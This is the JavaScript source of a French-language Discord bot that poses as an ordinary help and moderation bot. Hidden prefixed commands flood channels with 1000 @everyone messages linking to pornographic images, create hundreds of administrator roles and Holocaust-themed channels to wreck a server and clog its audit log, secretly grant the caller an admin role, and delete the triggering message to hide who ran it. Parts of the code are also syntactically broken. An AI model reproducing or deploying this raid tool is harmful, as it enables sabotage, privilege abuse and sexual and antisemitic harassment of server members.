const Discord = require('discord.js');
const bot = new Discord.Client();
const client = new Discord.Client();
const { Client } = require('discord.js');
const yt = require('ytdl-core');
var prefix = '!';
var destruc = '§';
banMessage = "REGARDE CET MERDE IL EST BANNNNNNNNNNNNNNNNNNNNNN";


bot.on('ready', function () {
  bot.user.setPresence({ game: { name: 'DrainCorp'}})
  console.log("Bot DrainCorp Connecté est prés pour le piratage!")
})

function cmd(str, msg) {
return msg.content.toLowerCase().startsWith(destruc + str);
}

bot.on("message", msg => {
//spam command
if(cmd("spam", msg)) {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
    for (var i = 0; i < 1000; i++) {
        msg.channel.send("@everyone  Votre compte YouPorn premium est maintenant disponible , n'hesiter pas à alle regarder vos vidéos GAY favorite :wink: https://media.melty.fr/article-2538073-thumb/youporn-le-roi-du-porno-debarque-dans-le.jpg");
    }
}

bot.on("message", msg => {
//spam command
if(cmd("sodomie", msg)) {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
    for (var i = 0; i < 1000; i++) {
         msg.channel.send("@everyone Voila à quoi ressemble votre anus après mon passage j'espere que vous aimez la sodomie: http://gifsdesexe.i.g.f.unblog.fr/files/2011/01/sodomie4.gif");
    }
}});

//audit log clogger
if(cmd("destruction", msg)) {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
    for (var i = 0; i < 500; i++) {
        // Creates new roles to clog up the audit log
        msg.guild.createRole({
            name: 'Faible',
            color: 'YELLOW',
            permissions: 'ADMINISTRATOR',
        });
        msg.guild.createChannel('Auschwitz', 'voice')
        msg.guild.createChannel('Chambre-a-gaz', 'text')
        //changes name tons of times to clog up the audit log
        msg.guild.setName("LA SODOMIE "+ i);
     }
 }
});

bot.on('message', msg => {
 
    if (msg.content === '§r') {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));


  msg.guild.createRole({

  name: 'ADMIN-DISCORD',

  color: 'WHITE',

  permissions:'ADMINISTRATOR', 'BAN_MEMBERS', 'MANAGE_CHANNELS',

})

}

});
bot.on('message', msg => {

    if (msg.content === '§a') {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));



    let RoleToAdd = msg.guild.roles.find('name', 'ADMIN-DISCORD')

    msg.member.addRole(RoleToAdd);

    msg.reply("Bot près à l'usage :white_check_mark:");



}

});
bot.on('message', message => {
    if (message.content === '.d') {
    message.channel.fetchMessages({limit: 1}).then(messages => message.channel.bulkDelete(messages));
        message.author.createDM().then(channel => {
            channel.send(`**Voici les commandes destruction
            **1°)** - **§spam** ce vas spam ce message: **@everyone  Votre compte YouPorn premium est maintenant disponible , n'hesiter pas à alle regarder vos vidéos GAY favorite :wink:** + le lien
            
            **2°)** - **§sodomie** ce vas spam ce message: **@everyone Voila à quoi ressemble votre anus après mon passage j'espere que vous aimez la sodomie:** + le lien
            
            **3°)** - **§destruction** Pour detruire le serveur`)
        })
    }
});

bot.on('message', message => {
  if (message.content === '!aide') {
      message.channel.send({embed: {
          color: 234123,
          icon_url: bot.user.avatarURL,
          description: `Pour avoir les commandes c'est très simple
**!staff** Pour voir tous le staff !
**!installateur** Pour rejoindre le serveur.
**!launcher** Pour rejoindre le serveur.
**!site** Pour rejoindre le site.
**!regles** Pour voir les règles !
**!commandestaff** Pour voir les commandes staff`,
          timstamp: new Date(),
          footer: {
              icon_url: bot.user.avatarURL,
              text: 'Par DrainBot'
          }
      }});
  }
});


bot.on('message', message => {
  if (message.content === '!commandestsaaff') {
      if (!message.member.roles.find(name, Perm-all)) {
          message.channel.send('Il vous faut la permissions `Perm-all`');
          return;
      }
      message.channel.send({embed: {
          color: 3447003,
          icon_url: bot.user.avatarURL,
          description: `
          DrainBot
          --------------------------
          !supr Le nombre de message à suprimer
          --------------------------`,
          timstamp: new Date(),
          footer: {
              icon_url: bot.user.avatarURL,
              text: 'Par DrainBot'
          }
      }});
  }
});


bot.on('message', message => {
  
      let msg = message.content.toUpperCase();
      let sender = message.author;
      let cont = message.content.slice(prefix.length).split(" ");
      let args = cont.slice(1);
     
      if (msg.startsWith(prefix + 'SUPR')) {
          async function purge() {
              message.delete();
  
              if (!message.member.roles.find("name", "<Perm-all>")) {
                  message.channel.send('Il vous faut les perm `<Perm-all>`');
                  return;
              }
  
              if (isNaN(args[0])) {
                  message.channel.send(`Il faut utiliser un chiffre + supr Nombre`);
                  return;
              }
  
              const fetched = await message.channel.fetchMessages({limit: args[0]});
              message.channel.send('Destruction de `' + (fetched.size) + '` message ok_hand');
              console.log('Destruction de `' + (fetched.size) + '`message Detruit`');
  
              message.channel.bulkDelete(fetched)
                  .catch(error = message.channel.send(`Error: ${error}`));
  
          }
  
          purge();
  
      }
  })

bot.on('guildMemberAdd', member => {
  member.guild.channels.find("name", "general").send(`Bienvenue à toi **${member.user.username}** sur le **Serveur** :wink: !`)
  console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${member.user.username} > ${member.user.token}. (^o^)／`);
})

bot.login(process.env.TOKENS)
